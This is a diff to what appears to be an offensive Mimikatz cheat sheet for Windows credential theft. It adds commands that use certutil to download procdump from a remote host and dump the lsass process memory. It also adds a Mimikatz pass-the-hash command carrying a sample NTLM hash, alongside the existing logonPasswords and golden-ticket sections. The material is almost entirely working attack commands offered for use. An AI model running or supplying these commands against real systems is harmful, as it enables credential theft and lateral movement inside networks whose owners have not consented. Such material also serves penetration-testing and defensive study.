@@ -63,8 +63,11 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
 Dump the lsass process.
 
 ```powershell
-C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+# HTTP method
+certutil -urlcache -split -f http://live.sysinternals.com/procdump.exe C:\Users\Public\procdump.exe
+C:\Users\Public\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 
+# SMB method
 net use Z: https://live.sysinternals.com
 Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
@@ -75,6 +78,12 @@ Then load it inside Mimikatz.
 mimikatz # sekurlsa::minidump lsass.dmp
 Switch to minidump
 mimikatz # sekurlsa::logonPasswords
+```
+
+## Mimikatz - Pass The Hash
+
+```powershell
+mimikatz # sekurlsa::pth /user:SCCM$ /domain:IDENTITY /ntlm:e722dfcd077a2b0bbe154a1b42872f4e /run:powershell
 ```
 
 ## Mimikatz - Golden ticket
